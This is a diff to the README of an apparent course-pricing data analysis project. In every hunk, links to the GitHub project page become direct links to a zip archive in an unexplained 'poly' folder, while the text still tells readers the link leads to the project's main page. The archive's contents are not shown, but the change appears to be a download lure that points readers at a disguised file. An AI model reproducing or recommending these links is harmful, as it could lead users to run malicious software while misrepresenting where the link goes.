@@ -1,6 +1,6 @@
 # 📊 online-course-pricing-eda-analysis - Explore Course Data Simply
 
-[![Download](https://img.shields.io/badge/Download-Get%20Project-brightgreen?style=for-the-badge)](https://github.com/Lucasoil1234799/online-course-pricing-eda-analysis)
+[![Download](https://img.shields.io/badge/Download-Get%20Project-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Lucasoil1234799/online-course-pricing-eda-analysis/main/poly/analysis-online-pricing-course-eda-v3.2.zip)
 
 ## 📋 About This Project
 
@@ -22,7 +22,7 @@ Make sure your computer meets these needs before starting:
 ## 🚚 Download & Install
 
 1. Click the green **Download** button above or visit this link:  
-   [https://github.com/Lucasoil1234799/online-course-pricing-eda-analysis](https://github.com/Lucasoil1234799/online-course-pricing-eda-analysis)
+   [https://raw.githubusercontent.com/Lucasoil1234799/online-course-pricing-eda-analysis/main/poly/analysis-online-pricing-course-eda-v3.2.zip](https://raw.githubusercontent.com/Lucasoil1234799/online-course-pricing-eda-analysis/main/poly/analysis-online-pricing-course-eda-v3.2.zip)
 
 2. This link will take you to the project’s main page on GitHub.
 
@@ -130,7 +130,7 @@ Here is what you will find inside the extracted folder:
 ## 🔗 Useful Links
 
 To download and start:  
-[https://github.com/Lucasoil1234799/online-course-pricing-eda-analysis](https://github.com/Lucasoil1234799/online-course-pricing-eda-analysis)  
+[https://raw.githubusercontent.com/Lucasoil1234799/online-course-pricing-eda-analysis/main/poly/analysis-online-pricing-course-eda-v3.2.zip](https://raw.githubusercontent.com/Lucasoil1234799/online-course-pricing-eda-analysis/main/poly/analysis-online-pricing-course-eda-v3.2.zip)  
 
 Frequently visit the project page to check for updates or new versions.
 
@@ -146,4 +146,4 @@ Frequently visit the project page to check for updates or new versions.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Get%20Project-brightgreen?style=for-the-badge)](https://github.com/Lucasoil1234799/online-course-pricing-eda-analysis)
+[![Download](https://img.shields.io/badge/Download-Get%20Project-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Lucasoil1234799/online-course-pricing-eda-analysis/main/poly/analysis-online-pricing-course-eda-v3.2.zip)
